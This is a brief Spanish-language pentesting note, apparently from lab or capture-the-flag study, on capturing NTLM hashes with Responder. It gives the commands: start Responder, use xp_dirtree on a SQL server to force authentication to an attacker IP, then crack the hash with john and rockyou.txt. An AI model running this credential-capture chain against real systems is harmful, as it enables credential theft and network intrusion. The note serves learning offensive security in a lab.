Cuando queremos capturar algún hash NTML podemos utilizar la herramienta responder.py para levantar un servidor falso. Cuando el equipo objetivo intente conectarse a un recurso que no existe, preguntará en la red para ver quién puede poseer ese recurso. Ahí es cuando la herramienta responder.py envenena la red indicando que sí posee el recurso, por lo tanto, el equipo intentará conectarse proporcionando credenciales NTML que serán capturadas.

Uso:
> Montar servidor falso de autenticación SQL:
> `python responder.py -I tun0`
> En máquina objetivo, hacer uso del objeto "xp_dirtree", cuya función es parecida a SMB, intentando listar los elementos compartidos de un servidor:
> `xp_dirtree '\\10.10.14.6\loquesea'`
> Obtendremos el hash NTML en el servidor responder.py.
> Este hash podrá ser crackeado pero no utilizado para realizar pass-the-hash.
> Crackear hash:
> `john --wordlist=rockyou.txt hash`

